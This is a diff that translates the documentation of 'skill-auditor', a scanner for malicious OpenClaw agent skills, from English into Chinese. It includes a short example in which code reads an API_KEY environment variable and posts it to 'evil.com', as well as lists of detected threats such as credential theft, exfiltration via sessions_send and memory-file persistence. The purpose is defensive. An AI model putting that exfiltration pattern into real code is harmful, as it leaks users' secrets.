@@ -1,53 +1,53 @@
 ---
 name: skill-auditor
 version: 2.1.3
-description: "Security scanner that catches malicious skills before they steal your data. Detects credential theft, prompt injection, and hidden backdoors. Works immediately with zero setup. Optional AST dataflow analysis traces how your data moves through code."
+description: "这是一款安全扫描工具，能够在恶意行为窃取您的数据之前将其拦截。它能够检测到凭证盗窃、代码注入（prompt injection）以及隐藏的后门（hidden backdoors）等安全威胁。该工具无需任何配置即可立即使用。此外，它还提供了可选的AST（Abstract Syntax Tree）数据流分析功能，可追踪您的数据在代码中的传输路径。"
 ---
 
 # Skill Auditor v2.1
 
-Enhanced security scanner that analyzes skills and provides comprehensive threat detection with advanced analysis capabilities.
+这是一个增强型的安全扫描工具，能够分析各种技能（skills）并利用先进的分析能力提供全面的威胁检测服务。
 
-## After Installing
+## 安装完成后
 
-Run the setup wizard to configure optional features:
+运行设置向导来配置可选功能：
 
 ```bash
 cd skills/skill-auditor
 node scripts/setup.js
 ```
 
-The wizard explains each feature, shows real test data, and lets you choose what to enable.
+该向导会解释每个功能的用途，展示实际测试数据，并允许您选择要启用的功能。
 
-## Quick Start
+## 快速入门
 
-**Scan a skill:**
+**扫描某个技能：**
 ```bash
 node skills/skill-auditor/scripts/scan-skill.js <skill-directory>
 ```
 
-**Audit all your installed skills:**
+**审计所有已安装的技能：**
 ```bash
 node skills/skill-auditor/scripts/audit-installed.js
 ```
 
-## Setup Wizard (Recommended)
+## 建议使用设置向导
 
-Run the interactive setup to configure optional features:
+运行交互式设置向导来配置可选功能：
 
 ```bash
 cd skills/skill-auditor
 node scripts/setup.js
 ```
 
-The wizard will:
-1. **Detect your OS** (Windows, macOS, Linux)
-2. **Check Python availability** (required for AST analysis)
-3. **Offer to install tree-sitter** for dataflow analysis
-4. **Configure auto-scan** on skill installation
-5. **Save preferences** to `~/.openclaw/skill-auditor.json`
+向导将执行以下操作：
+1. **检测您的操作系统**（Windows、macOS、Linux）
+2. **检查Python是否已安装**（AST分析所需）
+3. **提供安装tree-sitter的选项**（用于数据流分析）
+4. **配置技能安装时的自动扫描功能**
+5. **将偏好设置保存到`~/.openclaw/skill-auditor.json`文件中**
 
-### Setup Commands
+### 设置命令
 
 ```bash
 node scripts/setup.js           # Interactive setup wizard
@@ -55,69 +55,71 @@ node scripts/setup.js --status  # Show current configuration
 node scripts/setup.js --enable-ast  # Just enable AST analysis
 ```
 
-## Audit All Installed Skills
+## 审计所有已安装的技能
 
-Scan every skill in your OpenClaw installation at once:
+一次性扫描OpenClaw安装中的所有技能：
 
 ```bash
 node scripts/audit-installed.js
 ```
 
-**Options:**
+**选项：**
 ```bash
 node scripts/audit-installed.js --severity critical  # Only critical issues
 node scripts/audit-installed.js --json               # Save results to audit-results.json
 node scripts/audit-installed.js --verbose            # Show top findings per skill
 ```
 
-**Output:**
-- Color-coded risk levels (🚨 CRITICAL, ⚠️ HIGH, 📋 MEDIUM, ✅ CLEAN)
-- Summary stats (total scanned, by risk level)
-- Detailed list of high-risk skills with capabilities
+**输出结果：**
+- 风险等级（🚨 严重、⚠️ 高风险、📋 中等、✅ 无风险）
+- 统计信息（总扫描次数、按风险等级分类）
+- 高风险技能的详细列表及其功能
 
-## Cross-Platform Installation
+## 跨平台安装
 
-### Core Scanner (No Dependencies)
-Works on all platforms with just Node.js (which OpenClaw already provides).
+### 核心扫描功能（无需额外依赖）
 
-### AST Analysis (Optional)
-Requires Python 3.8+ and tree-sitter packages.
+仅需Node.js（OpenClaw已提供）即可在所有平台上运行。
 
-| Platform | Python Install | Tree-sitter Install |
+### AST分析（可选）
+
+需要Python 3.8及以上版本以及tree-sitter包。
+
+| 平台 | Python安装 | Tree-sitter安装 |
 |----------|----------------|---------------------|
-| **Windows** | Pre-installed or `winget install Python.Python.3` | `pip install tree-sitter tree-sitter-python` |
-| **macOS** | Pre-installed or `brew install python3` | `pip3 install tree-sitter tree-sitter-python` |
+| **Windows** | 已预装或使用`winget install Python.Python.3` | `pip install tree-sitter tree-sitter-python` |
+| **macOS** | 已预装或使用`brew install python3` | `pip3 install tree-sitter tree-sitter-python` |
 | **Linux** | `apt install python3-pip` | `pip3 install tree-sitter tree-sitter-python` |
 
-**Note:** Tree-sitter has prebuilt wheels for all platforms — no C++ compiler needed!
+**注意：**Tree-sitter为所有平台提供了预编译的安装包——无需C++编译器！
 
-## Core Features (Always Available)
+## 核心功能（始终可用）
 
-- **Static Pattern Analysis** — Regex-based detection of 40+ threat patterns
-- **Intent Matching** — Contextual analysis against skill's stated purpose
-- **Accuracy Scoring** — Rates how well behavior matches description (1-10)
-- **Risk Assessment** — CLEAN / LOW / MEDIUM / HIGH / CRITICAL levels
-- **OpenClaw Specifics** — Detects MEMORY.md, sessions tools, agent manipulation
-- **Remote Scanning** — Works with GitHub URLs (via scan-url.js)
-- **Visual Reports** — Human-readable threat summaries
+- **静态模式分析**——基于正则表达式的40多种威胁模式检测
+- **意图匹配**——根据技能的描述进行上下文分析
+- **准确性评分**——评估行为与描述的匹配程度（1-10分）
+- **风险评估**——分为无风险、低风险、中等风险、高风险、严重风险
+- **OpenClaw特定功能**——能够检测MEMORY.md文件、会话工具以及代理程序的操控行为
+- **远程扫描**——支持通过scan-url.js扫描GitHub上的代码
+- **可视化报告**——提供易于阅读的威胁摘要
 
-## Advanced Features (Optional)
+## 高级功能（可选）
 
-### 1. Python AST Dataflow Analysis
-**Traces data from sources to sinks through code execution paths**
+### 1. Python AST数据流分析
+**通过代码执行路径追踪数据流动**
 
 ```bash
 npm install tree-sitter tree-sitter-python
 node scripts/scan-skill.js <skill> --mode strict
 ```
 
-**What it detects:**
-- Environment variables → Network requests
-- File reads → HTTP posts  
-- Memory file access → External APIs
-- Cross-function data flows
+**检测内容：**
+- 环境变量 → 网络请求
+- 文件读取 → HTTP请求
+- 内存文件访问 → 外部API调用
+- 跨函数的数据流动
 
-**Example:**
+**示例：**
 ```python
 # File 1: utils.py
 def get_secrets(): return os.environ.get('API_KEY')
@@ -127,50 +129,51 @@ key = get_secrets()
 requests.post('evil.com', data=key)  # ← Dataflow detected!
 ```
 
-### 2. VirusTotal Binary Scanning
-**Scans executable files against 70+ antivirus engines**
+### 2. VirusTotal二进制文件扫描
+**使用70多种杀毒引擎扫描可执行文件**
 
 ```bash
 export VIRUSTOTAL_API_KEY="your-key-here"
 node scripts/scan-skill.js <skill> --use-virustotal
 ```
 
-**Supported formats:** .exe, .dll, .bin, .wasm, .jar, .apk, etc.
+**支持的文件格式：**.exe、.dll、.bin、.wasm、.jar、.apk等
 
-**Output includes:**
-- Malware detection status
-- Engine consensus (e.g., "3/70 engines flagged")  
-- Direct VirusTotal report links
-- SHA256 hashes for verification
+**输出内容：**
+- 恶意软件检测结果
+- 杀毒引擎的检测结果（例如：“3/70个引擎标记为恶意文件”）
+- VirusTotal的检测报告链接
+- 文件的SHA256哈希值（用于验证）
 
-### 3. LLM Semantic Analysis
-**Uses AI to understand if detected behaviors match stated intent**
+### 3. LLM语义分析
+**利用人工智能判断检测到的行为是否与技能描述相符**
 
 ```bash
 # Requires OpenClaw gateway running
 node scripts/scan-skill.js <skill> --use-llm
 ```
 
-**How it works:**
-1. Groups findings by category
-2. Asks LLM: "Does this behavior match the skill's description?"
-3. Adjusts severity based on semantic understanding
-4. Provides confidence ratings
+**工作原理：**
+1. 按类别整理检测结果
+2. 向大型语言模型（LLM）询问：“该行为是否符合技能的描述？”
+3. 根据语义分析结果调整风险等级
+4. 提供置信度评分
 
-**Example:**
-- **Finding:** "Accesses MEMORY.md"
-- **Skill says:** "Optimizes agent memory usage"
-- **LLM verdict:** "LEGITIMATE — directly supports stated purpose"
-- **Result:** Severity downgraded, marked as expected
+**示例：**
+- **检测结果：**“访问了MEMORY.md文件”
+- **技能描述：**“优化代理程序的内存使用”
+- **LLM判断：**“合法行为——符合技能描述”
+- **结果：**风险等级降低，标记为“合法”
 
-### 4. SARIF Output for CI/CD
-**GitHub Code Scanning compatible format**
+### 4. SARIF输出格式（适用于CI/CD流程）
+
+**兼容GitHub的代码扫描格式**
 
 ```bash
 node scripts/scan-skill.js <skill> --format sarif --fail-on-findings
 ```
 
-**GitHub integration:**
+**GitHub集成方式：**
 ```yaml
 # .github/workflows/skill-scan.yml
 - name: Scan Skills
@@ -183,8 +186,8 @@ node scripts/scan-skill.js <skill> --format sarif --fail-on-findings
     sarif_file: results.sarif
 ```
 
-### 5. Detection Modes
-**Adjustable sensitivity levels**
+### 5. 检测模式**
+**可调节的敏感度设置**
 
 ```bash
 --mode strict      # All patterns, higher false positives
@@ -192,9 +195,9 @@ node scripts/scan-skill.js <skill> --format sarif --fail-on-findings
 --mode permissive  # Only critical patterns
 ```
 
-## Usage Examples
+## 使用示例
 
-### Basic Scanning
+### 基本扫描
 ```bash
 # Scan local skill
 node scripts/scan-skill.js ../my-skill
@@ -206,7 +209,7 @@ node scripts/scan-skill.js ../my-skill --json report.json
 node scripts/format-report.js report.json
 ```
 
-### Advanced Scanning
+### 高级扫描
 ```bash
 # Full analysis with all features
 node scripts/scan-skill.js ../my-skill \
@@ -223,22 +226,23 @@ node scripts/scan-skill.js ../my-skill \
   --mode balanced
 ```
 
-### Remote Scanning
+### 远程扫描
 ```bash
 # Scan GitHub skill without cloning
 node scripts/scan-url.js "https://github.com/user/skill" --json remote-report.json
 node scripts/format-report.js remote-report.json
 ```
 
-## Installation Options
+## 安装选项
 
-### Zero Dependencies (Recommended for CI)
+### 无依赖（推荐用于持续集成环境）
+
 ```bash
 # Works immediately — no installation needed
 node skill-auditor/scripts/scan-skill.js <skill>
 ```
 
-### Optional Advanced Features  
+### 可选的高级功能
 ```bash
 cd skills/skill-auditor
 
@@ -256,32 +260,33 @@ export VIRUSTOTAL_API_KEY="your-key"
 openclaw gateway start
 ```
 
-## What Gets Detected
+## 检测内容
 
-### Core Threat Categories
-- **Prompt Injection** — AI instruction manipulation attempts
-- **Data Exfiltration** — Unauthorized data transmission
-- **Sensitive File Access** — MEMORY.md, credentials, SSH keys
-- **Shell Execution** — Command injection, arbitrary code execution
-- **Path Traversal** — Directory escape attacks
-- **Obfuscation** — Hidden/encoded content
-- **Persistence** — System modification for permanent access
-- **Privilege Escalation** — Browser automation, device access
+### 核心威胁类别
+- **提示注入**——尝试操控用户输入
+- **数据泄露**——未经授权的数据传输
+- **敏感文件访问**——包括MEMORY.md文件、凭证信息、SSH密钥
+- **shell命令执行**——命令注入、任意代码执行
+- **路径遍历**——目录遍历攻击
+- **代码混淆**——隐藏/加密的代码
+- **持久化攻击**——对系统进行修改以实现长期访问
+- **权限提升**——浏览器自动化操作、设备控制
 
-### OpenClaw-Specific Patterns
-- **Memory File Writes** — Persistence via MEMORY.md, AGENTS.md
-- **Session Tool Abuse** — Data exfiltration via sessions_send
-- **Gateway Control** — config.patch, restart commands
-- **Node Device Access** — camera_snap, screen_record, location_get
+### OpenClaw特有的检测模式
+- **内存文件写入**——通过MEMORY.md、AGENTS.md文件实现持久化攻击
+- **会话工具滥用**——通过sessions_send功能进行数据泄露
+- **网关控制**——配置修改、重启命令
+- **设备访问**——包括摄像头截图、屏幕录制、位置信息获取
 
-### Advanced Detection (with optional features)
-- **Python Dataflow** — Variable tracking across functions/files
-- **Binary Malware** — Known malicious executables via VirusTotal
-- **Semantic Intent** — LLM-based behavior vs. description analysis
+### 高级检测（需启用可选功能）
 
-## Output Formats
+- **Python数据流分析**——跨函数/文件的变量追踪
+- **二进制恶意文件**——通过VirusTotal检测已知恶意文件
+- **语义意图分析**——利用人工智能分析行为与技能描述的匹配程度
 
-### 1. JSON (Default)
+## 输出格式
+
+### 1. JSON（默认格式）
 ```json
 {
   "skill": { "name": "example", "description": "..." },
@@ -292,27 +297,27 @@ openclaw gateway start
 }
 ```
 
-### 2. SARIF (GitHub Code Scanning)
+### 2. SARIF格式（适用于GitHub代码扫描）
 ```bash
 --format sarif
 ```
-Uploads to GitHub Security tab, integrates with pull request checks.
+支持上传到GitHub的安全检查页面，可与拉取请求（pull request）集成
 
-### 3. Visual Report
+### 3. 可视化报告
 ```bash
 node scripts/format-report.js report.json
 ```
-Human-readable summary with threat gauge and actionable findings.
+提供易于阅读的威胁摘要以及可采取的操作建议。
 
-## Configuration
+## 配置选项
 
-### Environment Variables
+### 环境变量设置
 ```bash
 VIRUSTOTAL_API_KEY="vt-key"     # VirusTotal integration
 DEBUG="1"                       # Verbose error output
 ```
 
-### Command Line Options
+### 命令行参数设置
 ```bash
 --json <file>         # JSON output file
 --format sarif        # SARIF output for GitHub
@@ -324,7 +329,7 @@ DEBUG="1"                       # Verbose error output
 --help              # Show all options
 ```
 
-## Architecture Overview
+## 架构概述
 
 ```
 skill-auditor/
@@ -345,74 +350,77 @@ skill-auditor/
 └── references/              # Documentation (unchanged)
 ```
 
-## Backward Compatibility
+## 向后兼容性
 
-**v1.x commands work unchanged:**
+**v1.x版本的命令可以正常使用：**
 ```bash
 node scan-skill.js <skill-dir>                    # ✅ Works
 node scan-skill.js <skill-dir> --json out.json    # ✅ Works  
 node format-report.js out.json                    # ✅ Works
 ```
 
-**New v2.0 features are opt-in:**
+**v2.0的新功能为可选配置：**
 ```bash
 node scan-skill.js <skill-dir> --use-llm          # ⚡ Enhanced
 node scan-skill.js <skill-dir> --use-virustotal   # ⚡ Enhanced
 ```
 
-## Limitations
+## 限制
 
-### Core Scanner
-- **Novel obfuscation** — New encoding techniques not yet in patterns
-- **Binary analysis** — Skips binary files unless VirusTotal enabled  
-- **Sophisticated prompt injection** — Advanced manipulation techniques may evade regex
+### 核心扫描功能
 
-### Optional Features  
-- **Python AST** — Limited to Python files, basic dataflow only
-- **VirusTotal** — Rate limited (500 queries/day free tier)
-- **LLM Analysis** — Requires internet connection and OpenClaw gateway
-- **YARA Rules** — Framework ready but custom rules not fully implemented
+- **新型混淆技术**——某些新型混淆技术尚未被纳入检测模式
+- **二进制文件分析**——除非启用了VirusTotal，否则不会扫描二进制文件
+- **复杂的提示注入攻击**——某些高级操控技巧可能逃避正则表达式的检测
 
-## Troubleshooting
+### 可选功能
 
-### Common Issues
+- **Python AST分析**——仅限于Python文件，且仅支持基本的数据流分析
+- **VirusTotal扫描**——免费 tier每天仅支持500次查询
+- **LLM分析**——需要网络连接和OpenClaw网关
+- **YARA规则**——框架已准备好，但自定义规则尚未完全实现
 
-**"tree-sitter dependencies not available"**
+## 故障排除
+
+### 常见问题
+
+- **“tree-sitter依赖项未找到”**
 ```bash
 npm install tree-sitter tree-sitter-python
 ```
 
-**"VirusTotal API error: 403"**
+- **“VirusTotal API错误：403”**
 ```bash
 export VIRUSTOTAL_API_KEY="your-actual-key"
 ```
 
-**"LLM semantic analysis failed"**
+- **“LLM语义分析失败”**
 ```bash
 # Check OpenClaw gateway is running:
 openclaw gateway status
 curl http://localhost:18789/api/v1/health
 ```
 
-**"SARIF output not generated"**
+- **“未生成SARIF输出”**
 ```bash
 # Ensure all dependencies installed:
 cd skills/skill-auditor && npm install
 ```
 
-### Debug Mode
+### 调试模式
 ```bash
 DEBUG=1 node scripts/scan-skill.js <skill>
 ```
 
-## Contributing
+## 贡献方式
 
-### Adding New Patterns
-1. **Static patterns** → Edit `scripts/analyzers/static.js`
-2. **YARA rules** → Add to `rules/` directory
-3. **Python dataflow** → Extend `scripts/analyzers/ast-python.js`
+### 添加新的检测规则
 
-### Testing New Features
+- **静态检测规则**——编辑`scripts/analyzers/static.js`
+- **YARA规则**——添加到`rules/`目录
+- **Python数据流分析**——扩展`scripts/analyzers/ast-python.js`
+
+### 新功能的测试方法
 ```bash
 # Test against multiple skills:
 node scripts/scan-skill.js ../blogwatcher --use-llm --mode strict
@@ -420,15 +428,15 @@ node scripts/scan-skill.js ../summarize --use-virustotal
 node scripts/scan-skill.js ../secure-browser-agent --format sarif
 ```
 
-## Security Note
+## 安全提示
 
-**This scanner is one layer of defense**, not a guarantee. Always:
-- Review code manually for novel attacks
-- Re-scan after skill updates  
-- Use multiple security tools
-- Trust but verify — especially for high-privilege skills
+**本扫描工具仅作为防御手段之一，并不能提供绝对的安全保障。**请务必：
+- 手动审查代码以发现新型攻击
+- 在技能更新后重新扫描
+- 使用多种安全工具进行检测
+- 即使使用高级功能，也要保持警惕
 
-**For sensitive environments**, enable all advanced features:
+**对于敏感环境**，建议启用所有高级功能：
 ```bash
 node scripts/scan-skill.js <skill> \
   --mode strict \
